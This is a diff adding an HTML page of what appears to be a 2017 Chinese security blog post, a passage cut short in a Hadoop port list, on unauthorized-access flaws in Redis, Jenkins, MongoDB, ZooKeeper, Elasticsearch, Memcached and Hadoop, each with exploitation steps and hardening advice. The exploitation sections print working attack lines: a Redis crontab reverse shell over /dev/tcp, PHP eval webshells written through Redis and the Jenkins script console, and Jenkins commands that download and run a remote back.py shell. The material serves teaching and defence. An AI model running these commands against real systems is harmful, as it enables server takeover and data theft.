@@ -1,0 +1,1465 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="w2n1ck" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="前言今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。 0x01 介绍未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="w2n1ck">
+<meta property="og:url" content="http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="前言今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。 0x01 介绍未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/ransomware123.jpg">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/redis-11.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/redis-5.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-1.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-2.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-3.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-4.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-5.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/mongodb-1.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-1.jpg">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-2.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/elasticsearch-1.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/memcached-2.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/Hadoop-1.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-7.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-11.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-2.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-3.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-4.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-5.png">
+<meta property="og:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-6.png">
+<meta property="og:updated_time" content="2017-10-17T12:28:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="w2n1ck">
+<meta name="twitter:description" content="前言今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。 0x01 介绍未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、">
+<meta name="twitter:image" content="http://www.secpulse.com/wp-content/uploads/2017/09/ransomware123.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/"/>
+
+
+
+
+
+  <title> | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-26T11:24:03+08:00">
+                2017-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/26/未授权访问漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/09/26/未授权访问漏洞/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/ransomware123.jpg" alt=""></p>
+<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p><strong>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</strong></p>
+<p>目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等，本文主要介绍一些目前比较常用的一些服务的未授权访问，欢迎大家补充！</p>
+<h1 id="0x02-Redis未授权访问"><a href="#0x02-Redis未授权访问" class="headerlink" title="0x02 Redis未授权访问"></a>0x02 Redis未授权访问</h1><h2 id="2-1-漏洞描述"><a href="#2-1-漏洞描述" class="headerlink" title="2.1 漏洞描述"></a>2.1 漏洞描述</h2><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
+<h2 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h2><p><em>1、利用计划任务执行命令反弹shell</em><br>在redis以root权限运行时可以写crontab来执行命令反弹shell</p>
+<p>先在自己的服务器上监听一个端口</p>
+<blockquote>
+<p>nc -lvnp 4444</p>
+</blockquote>
+<p>然后执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.2.6</div><div class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;</div><div class="line">config set dir /var/spool/cron/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-11.png" alt=""><br><em>2、写ssh-keygen公钥登录服务器</em><br>在以下条件下，可以利用此方法</p>
+<blockquote>
+<p>1、Redis服务使用root账号启动<br>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+</blockquote>
+<p>此方法具体参考：<a href="https://www.secpulse.com/archives/40406.html" target="_blank" rel="external">redis配置不当可直接导致服务器被控制</a><br><em>3、获取web服务的webshell</em><br>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p>
+<p>执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /var/www/html/</div><div class="line">config set dbfilename shell.php</div><div class="line">set x &quot;&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>即可将shell写入web目录<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-5.png" alt=""></p>
+<h2 id="2-3-漏洞加固"><a href="#2-3-漏洞加固" class="headerlink" title="2.3 漏洞加固"></a>2.3 漏洞加固</h2><p>可以配置redis.conf这个文件，在安装目录下</p>
+<ul>
+<li>默认只对本地开放</li>
+</ul>
+<blockquote>
+<p>bind 127.0.0.1</p>
+</blockquote>
+<ul>
+<li>添加登陆密码</li>
+</ul>
+<blockquote>
+<p>requirepass www.secpulse.com</p>
+</blockquote>
+<ul>
+<li>在需要对外开放的时候修改默认端口</li>
+</ul>
+<blockquote>
+<p>port 2333</p>
+</blockquote>
+<ul>
+<li>最后还可以配合iptables限制开放</li>
+</ul>
+<h1 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h1><h2 id="3-1-漏洞描述"><a href="#3-1-漏洞描述" class="headerlink" title="3.1 漏洞描述"></a>3.1 漏洞描述</h2><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+<h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><p><em>1、Jenkins未授权访问可执行命令</em><br><a href="http://www.secpulse.com:8080/manage" target="_blank" rel="external">http://www.secpulse.com:8080/manage</a><br><a href="http://www.secpulse.com:8080/script" target="_blank" rel="external">http://www.secpulse.com:8080/script</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-1.png" alt=""><br><strong>println “ifconfig -a”.execute().text  执行一些系统命令</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-2.png" alt=""><br><strong>直接wget下载back.py反弹shell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">println &quot;wget http://xxx.secpulse.com/tools/back.py -P /tmp/&quot;.execute().text</div><div class="line">println &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().text</div><div class="line">back.py并不需要root权限</div></pre></td></tr></table></figure></p>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-3.png" alt=""><br><strong>不想反弹试试Terminal Plugin</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-4.png" alt=""><br><em>2、Jenkins未授权访问写shell</em><br><strong>jenskins是java web项目,我们用java的File类写文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">new File(&quot;c://temp//secpulse.txt&quot;).write(&quot;&quot;&quot;</div><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">&quot;&quot;&quot;);</div></pre></td></tr></table></figure></p>
+<p>新建一个内容为1,2,3(每一行)的1.txt到c盘的temp文件夹,运行如下命令<code>println “powershell dir c:\temp”.execute().text</code>如果写成功,那么secpulse.txt就会在返回结果中!<br><strong>wget写webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1. println &quot;wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php&quot;.execute().text</div><div class="line">2. new File(&quot;/var/www/html/secpulse.php&quot;).write(&apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;);</div><div class="line">3. def webshell = &apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;</div><div class="line">new File(&quot;/var/www/html/secpulse.php&quot;).write(&quot;$webshell&quot;);</div><div class="line">4. def execute(cmd) &#123;</div><div class="line">def proc =  cmd.execute()</div><div class="line">proc.waitFor()</div><div class="line">&#125;</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[s3cpu1se]);?&gt;&quot; &gt;&gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">//参数-n 不要在最后自动换行</div></pre></td></tr></table></figure></p>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-5.png" alt=""><br>Result: 0 表示成功写入</p>
+<p>Result: 1 表示目录不存在或者权限不足 写入失败</p>
+<p>Result: 2 表示构造有异常 写入失败</p>
+<p>具体其他详细利用方法参考：<a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">知其一不知其二之Jenkins Hacking</a></p>
+<h2 id="3-3-漏洞加固"><a href="#3-3-漏洞加固" class="headerlink" title="3.3 漏洞加固"></a>3.3 漏洞加固</h2><ul>
+<li>禁止把Jenkins直接暴露在公网</li>
+<li>添加认证，建议使用用户矩阵或者与JIRA打通，JIRA设置密码复杂度</li>
+</ul>
+<h1 id="0x04-MongoDB未授权访问"><a href="#0x04-MongoDB未授权访问" class="headerlink" title="0x04 MongoDB未授权访问"></a>0x04 MongoDB未授权访问</h1><h2 id="4-1-漏洞描述"><a href="#4-1-漏洞描述" class="headerlink" title="4.1 漏洞描述"></a>4.1 漏洞描述</h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
+<h2 id="4-2-漏洞利用"><a href="#4-2-漏洞利用" class="headerlink" title="4.2 漏洞利用"></a>4.2 漏洞利用</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/mongodb-1.png" alt=""></p>
+<h2 id="4-3-漏洞加固"><a href="#4-3-漏洞加固" class="headerlink" title="4.3 漏洞加固"></a>4.3 漏洞加固</h2><ul>
+<li><p>为MongoDB添加认证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1)MongoDB启动时添加--auth参数</div><div class="line">2)给MongoDB添加用户：</div><div class="line">use admin  #使用admin库</div><div class="line">db.addUser(&quot;root&quot;, &quot;123456&quot;) #添加用户名root密码123456的用户</div><div class="line">db.auth(&quot;root&quot;,&quot;123456&quot;) #验证下是否添加成功，返回1说明成功</div></pre></td></tr></table></figure>
+</li>
+<li><p>禁用HTTP和REST端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false</div></pre></td></tr></table></figure>
+</li>
+<li><p>限制绑定IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">启动时加入参数</div><div class="line">--bind_ip 127.0.0.1</div><div class="line">或在/etc/mongodb.conf文件中添加以下内容：</div><div class="line">bind_ip = 127.0.0.1</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="0x05-ZooKeeper未授权访问"><a href="#0x05-ZooKeeper未授权访问" class="headerlink" title="0x05 ZooKeeper未授权访问"></a>0x05 ZooKeeper未授权访问</h1><h2 id="5-1-漏洞描述"><a href="#5-1-漏洞描述" class="headerlink" title="5.1 漏洞描述"></a>5.1 漏洞描述</h2><p>Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>
+<h2 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h2><p>执行以下命令即可远程获取该服务器的环境：</p>
+<blockquote>
+<p>echo envi | nc ip port</p>
+</blockquote>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-1.jpg" alt=""><br>直接连接：</p>
+<blockquote>
+<p>./zkCli.sh -server ip:port</p>
+</blockquote>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-2.png" alt=""></p>
+<h2 id="5-3-漏洞加固"><a href="#5-3-漏洞加固" class="headerlink" title="5.3 漏洞加固"></a>5.3 漏洞加固</h2><ul>
+<li>禁止把Zookeeper直接暴露在公网</li>
+<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li>
+<li>绑定指定IP访问</li>
+</ul>
+<h1 id="0x06-Elasticsearch未授权访问"><a href="#0x06-Elasticsearch未授权访问" class="headerlink" title="0x06 Elasticsearch未授权访问"></a>0x06 Elasticsearch未授权访问</h1><h2 id="6-1-漏洞描述"><a href="#6-1-漏洞描述" class="headerlink" title="6.1 漏洞描述"></a>6.1 漏洞描述</h2><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据</p>
+<h2 id="6-2-漏洞利用"><a href="#6-2-漏洞利用" class="headerlink" title="6.2 漏洞利用"></a>6.2 漏洞利用</h2><p>漏洞检测：默认端口9200</p>
+<p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。</p>
+<p><a href="http://x.x.x.x:9200/_nodes" target="_blank" rel="external">http://x.x.x.x:9200/_nodes</a></p>
+<p><a href="http://x.x.x.x:9200/_river" target="_blank" rel="external">http://x.x.x.x:9200/_river</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/elasticsearch-1.png" alt=""></p>
+<h2 id="6-3-漏洞加固"><a href="#6-3-漏洞加固" class="headerlink" title="6.3 漏洞加固"></a>6.3 漏洞加固</h2><ul>
+<li>防火墙上设置禁止外网访问此端口。</li>
+<li>使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证</li>
+<li>在config/elasticsearch.yml中为9200端口设置认证：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http.basic.enabled     true     #开关，开启会接管全部HTTP连接</div><div class="line">http.basic.user     &quot;admin&quot;     #账号</div><div class="line">http.basic.password     &quot;admin_pw&quot;     #密码</div><div class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]</div></pre></td></tr></table></figure>
+<h1 id="0x07-Memcache未授权访问"><a href="#0x07-Memcache未授权访问" class="headerlink" title="0x07 Memcache未授权访问"></a>0x07 Memcache未授权访问</h1><h2 id="7-1-漏洞描述"><a href="#7-1-漏洞描述" class="headerlink" title="7.1 漏洞描述"></a>7.1 漏洞描述</h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
+<h2 id="7-2-漏洞利用"><a href="#7-2-漏洞利用" class="headerlink" title="7.2 漏洞利用"></a>7.2 漏洞利用</h2><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
+<p>2、telnet <target> 11211，或nc -vv <target> 11211，提示连接成功表示漏洞存在<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/memcached-2.png" alt=""></target></target></p>
+<h2 id="7-3-漏洞加固"><a href="#7-3-漏洞加固" class="headerlink" title="7.3 漏洞加固"></a>7.3 漏洞加固</h2><ul>
+<li>设置memchached只允许本地访问</li>
+<li>禁止外网访问Memcached 11211端口</li>
+<li>编译时加上–enable-sasl，启用SASL认证</li>
+</ul>
+<h1 id="0x08-Hadoop未授权访问"><a href="#0x08-Hadoop未授权访问" class="headerlink" title="0x08 Hadoop未授权访问"></a>0x08 Hadoop未授权访问</h1><h2 id="8-1-漏洞描述"><a href="#8-1-漏洞描述" class="headerlink" title="8.1 漏洞描述"></a>8.1 漏洞描述</h2><p>由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
+<h2 id="8-2-漏洞利用"><a href="#8-2-漏洞利用" class="headerlink" title="8.2 漏洞利用"></a>8.2 漏洞利用</h2><p>主要HDFS和MapReduce的WebUI对应的服务端口。<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/Hadoop-1.png" alt=""><br>其中比较重要的是DataNode 默认端口50075开放的话，攻击者可以通过hdsf提供的restful api对hdfs存储数据进行操作。</p>
+<p>restful api参考：<a href="http://hadoop.apache.org/docs/r1.0.4/webhdfs.html" target="_blank" rel="external">http://hadoop.apache.org/docs/r1.0.4/webhdfs.html</a></p>
+<h2 id="8-3-漏洞加固"><a href="#8-3-漏洞加固" class="headerlink" title="8.3 漏洞加固"></a>8.3 漏洞加固</h2><ul>
+<li>如无必要，关闭Hadoop Web管理页面</li>
+<li>开启身份验证，防止未经授权用户访问</li>
+<li>设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口，详细端口列表如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">a)HDFS</div><div class="line">NameNode 默认端口 50070</div><div class="line">DataNode 默认端口 50075</div><div class="line">httpfs 默认端口14000</div><div class="line">journalnode 默认端口 8480</div><div class="line">b)YARN（JobTracker）</div><div class="line">ResourceManager 默认端口8088</div><div class="line">JobTracker 默认端口 50030</div><div class="line">TaskTracker 默认端口 50060</div><div class="line">c)Hue 默认端口 8080</div><div 